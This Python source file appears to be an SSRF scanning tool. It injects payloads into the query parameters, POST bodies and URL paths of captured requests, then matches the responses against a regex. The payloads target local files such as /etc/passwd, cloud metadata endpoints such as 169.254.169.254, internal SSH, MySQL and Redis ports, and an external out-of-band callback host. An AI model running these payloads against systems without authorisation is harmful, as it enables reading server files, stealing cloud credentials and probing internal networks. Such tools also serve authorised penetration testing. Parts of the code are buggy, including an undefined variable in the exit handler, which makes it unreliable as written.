import json
import logging
import asyncio
import httpx
import re
from urllib.parse import urlparse, urljoin, urlencode, parse_qs
from tabulate import tabulate
from colorama import init, Fore

# Initialize colorama for colored output
init(autoreset=True)

# Configuration
SSRF_PAYLOADS = [
    'file:///etc/passwd',
    'file://\/\/etc/passwd',
    'file://etc/passwd',
    'http://wmmxwwl7n8vhv62wptl0tq936uck09.oastify.com',
    'file:/etc/passwd',
    'file:/etc/passwd%3F',
    'file:/etc%252Fpasswd',
    'file:/etc%252Fpasswd%3F',
    'file:///etc/?/../passwd',
    'file:///etc/%3F/../passwd',
    'file:${br}/et${u}c/pas${te}swd',
    'file:${br}/et${u}c%252Fpas${te}swd',
    'file:${br}/et${u}c%252Fpas${te}swd%3F',
    'file:///etc/passwd?/../passwd',
    'file:///c:/./windows/./win.ini',
    'http://metadata.tencentyun.com/latest/meta-data/',
    'http://100.100.100.200/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/metadata/v1',
    'http://127.0.0.1:22',
    'http://127.0.0.1:3306',
    'dict://127.0.0.1:6379/info'
]

pattern = re.compile(
    r'[a-zA-Z_-]{1,}:x:[0-9]{1,}:[0-9]{1,}:'  # passwd file pattern
    r'|<html>(<head></head>)?<body>[a-z0-9]+</body>'  # Basic HTML pattern for collaborator
    r'|SSH-(\d\.\d)-OpenSSH_(\d\.\d)'  # SSH version pattern
    r'|(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'  # Redis errors
    r'|(\d\.\d\.\d)(.*?)mysql_native_password'  # MySQL version pattern
    r'|for 16-bit app support'   #Windows legacy support
    r'|dns-conf\/[\s\S]+instance\/'  # DNS config
    r'|app-id[\s\S]+placement\/'  # AWS App-ID
    r'|ami-id[\s\S]+placement\/'  # AWS AMI-ID
    r'|id[\s\S]+interfaces\/'  # AWS Network Interfaces
)
DEFAULT_TIMEOUT = 1

# Concurrency limit for async tasks
SEMAPHORE_LIMIT = 10  # You can adjust this value based on your system's capacity

async def inject_SSRF_payload(session, request, semaphore):
    """
    Inject SSRF payloads into the request and test for vulnerabilities, including path-based SSRF.
    
    Args:
        session: The HTTPX session.
        request: A dictionary containing request details from requests.json.
        semaphore: A semaphore for limiting concurrent requests.
    
    Returns:
        List of dictionaries containing results for each tested payload.
    """
    results = []
    url = request["url"]
    method = request.get("method", "GET").upper()
    headers = request.get("headers", {}).copy()
    body = request.get("body")
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    # Semaphore to limit concurrency
    async with semaphore:
        # Test GET requests with query parameters
        if method == "GET" and query_params:
            for param, values in query_params.items():
                for payload in SSRF_PAYLOADS:
                    modified_params = query_params.copy()
                    modified_params[param] = [payload for value in values]
                    new_query_string = "&".join(
                        f"{param}={value}" for param, values in modified_params.items() for value in values
                    )
                    new_url = urljoin(url, f"{parsed_url.path}?{new_query_string}")

                    result = await test_SSRF(session, new_url, method, headers=headers)
                    if result and result["SSRF_detected"]:
                        result["query_params"] = query_params  # Original query parameters
                        result["modified_query_params"] = modified_params  # Modified query parameters
                        result["payload"] = payload  # The payload used
                        results.append(result)
                        break  # Break after detecting SSRF and move to the next request

        # Test POST requests with payloads
        elif method == "POST" and body:
            for payload in SSRF_PAYLOADS:
                if isinstance(body, str):
                    modified_body = body + payload
                    logging.debug(f"Modified body size (str): {len(modified_body)}")
                    headers.pop("Content-Length", None)
                    headers["Transfer-Encoding"] = "chunked"  # Add chunked encoding
                elif isinstance(body, dict):
                    modified_body = {key: payload for key, value in body.items()}
                    body_str = json.dumps(modified_body)
                    logging.debug(f"Modified body size (dict): {len(body_str)}")
                    headers.pop("Content-Length", None)
#                    headers.pop("Transfer-Encoding", None)
                    headers["Transfer-Encoding"] = "chunked"
                else:
                    modified_body = body

                # Log body size before sending request
                logging.debug(f"Sending request with body size: {len(modified_body)}")

                # Send the request with the modified body
                try:
                    result = await test_SSRF(session, url, method, headers=headers, data=modified_body)
                    if result and result["SSRF_detected"]:
                        result["post_data"] = body  # Original POST data
                        result["modified_post_data"] = modified_body  # Modified POST data with payload
                        result["payload"] = payload  # The payload used
                        results.append(result)
                        break  # Break after detecting SSRF and move to the next request
                except Exception as e:
                    logging.error(f"Error while testing SSRF payload: {e}")
                    continue

        # Path-Based SSRF Detection (only modify path)
        if method == "GET" or method == "POST":
            path_parts = parsed_url.path.split('/')

            # Look for path segments that could be vulnerable
            for i, part in enumerate(path_parts):
                if part:  # Only modify non-empty path segments
                    for payload in SSRF_PAYLOADS:
                        path_parts[i] = payload
                        modified_path = '/'.join(path_parts[:i] + [payload])
                        new_url = urlparse(url)._replace(path=modified_path).geturl()

                        # Send the request with the modified path
                        try:
                            result = await test_SSRF(session, new_url, method, headers=headers)
                            if result and result["SSRF_detected"]:
                                result["path"] = parsed_url.path  # Original path
                                result["modified_path"] = modified_path  # Modified path with payload
                                result["payload"] = payload  # The payload used
                                results.append(result)
                                break  # Break after detecting SSRF and move to the next request
                        except Exception as e:
                            logging.error(f"Error while testing path-based SSRF payload: {e}")
                        path_parts[i] = part  # Reset path segment after testing

    return results

async def test_SSRF(session, url, method, headers=None, data=None):
    """
    Send an HTTP request and test for SSRF vulnerabilities.
    
    Args:
        session: The HTTPX session.
        url: The request URL.
        method: The HTTP method.
        headers: Optional headers for the request.
        data: Optional data for POST requests.
    
    Returns:
        A dictionary with the test results or None if no SSRF is detected.
    """
    try:
        response = await session.request(method, url, headers=headers, data=data, timeout=DEFAULT_TIMEOUT)

        for payload in SSRF_PAYLOADS:
            if pattern.search(response.text):  # Check for ssrf
                return {
                    "url": url,
                    "method": method,
                    "status_code": response.status_code,
                    "SSRF_detected": True,
                    "payload": payload
                }
        return {
            "url": url,
            "method": method,
            "status_code": response.status_code,
            "SSRF_detected": False
        }
    except httpx.RequestError as e:
        logging.error(f"Error testing {url} with payload: {data}. Exception: {e}")
        return {
            "url": url,
            "method": method,
            "status_code": "Error",
            "SSRF_detected": False,
            "error": str(e)
        }
    except Exception as e:
        logging.error(f"Unexpected error testing {url}: {e}")
        return {
            "url": url,
            "method": method,
            "status_code": "Error",
            "SSRF_detected": False,
            "error": str(e)
        }

async def process_requests(requests):
    """
    Process all requests from requests.json and check for SSRF vulnerabilities.
    
    Args:
        requests: A list of request dictionaries.
    
    Returns:
        A list of results from the SSRF tests.
    """
    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)  # Limit concurrent tasks
    async with httpx.AsyncClient() as session:
        tasks = [inject_SSRF_payload(session, request, semaphore) for request in requests]
        results = await asyncio.gather(*tasks)
        return [item for sublist in results for item in sublist]  # Flatten the results

def load_requests(file_path):
    """
    Load requests from requests.json.
    
    Args:
        file_path: Path to the JSON file containing request details.
    
    Returns:
        A list of request dictionaries.
    """
    with open(file_path, 'r') as f:
        return json.load(f)

def save_results(results, output_file):
    """
    Save results to a JSON file.
    
    Args:
        results: List of results from the SSRF tests.
        output_file: Path to the output file.
    """
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=4)

def save_output_on_exit(sig, frame):
    """Function to save output gracefully when interrupted."""
    logging.info("Saving output before exit...")
    with open("output.json", "w") as f:
        json.dump(requests_data, f, indent=4)
    logging.info("Output saved. Exiting...")
    sys.exit(0)

def print_results(results):
    """
    Print results in a formatted table.
    
    Args:
        results: List of results from the SSRF tests.
    """
    # Filter results to only show detected SSRF vulnerabilities
    SSRF_results = [result for result in results if result["SSRF_detected"]]

    if not SSRF_results:
        print(Fore.YELLOW + "No SSRF vulnerabilities detected.")
        return

    table_data = []
    for result in SSRF_results:
        table_data.append([
            result["url"],
            result["method"],
            result["status_code"],
            Fore.RED + "SSRF Detected"
        ])
    headers = ["URL", "Method", "Status Code", "SSRF Detection"]
    print(tabulate(table_data, headers, tablefmt="grid", stralign="center"))

async def main(input_file, output_file):
    """
    Main function to orchestrate the SSRF detection process.
    
    Args:
        input_file: Path to the input JSON file.
        output_file: Path to the output JSON file.
    """
    requests = load_requests(input_file)
    logging.info(f"Loaded {len(requests)} requests for testing.")

    results = await process_requests(requests)
    # Filter results to only include SSRF detections
    SSRF_results = [result for result in results if result["SSRF_detected"]]

    print_results(SSRF_results)
    save_results(SSRF_results, output_file)
    signal.signal(signal.SIGINT, save_output_on_exit)

if __name__ == "__main__":
    import argparse
    import sys
    import signal

    # Define a signal handler to save results on interrupt
    signal.signal(signal.SIGINT, save_output_on_exit)

    # Command-line argument parsing
    parser = argparse.ArgumentParser(description="SSRF Detection Tool")
    parser.add_argument("--input", default="requests.json", help="Input file with requests (default: requests.json)")
    parser.add_argument("--output", default="results_SSRF.json", help="Output file for results (default: results_SSRF.json)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()

    # Logging configuration
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    # Run the main function in the asyncio event loop
    try:
        asyncio.run(main(args.input, args.output))
    except KeyboardInterrupt:
        print("\nExecution interrupted by user.")

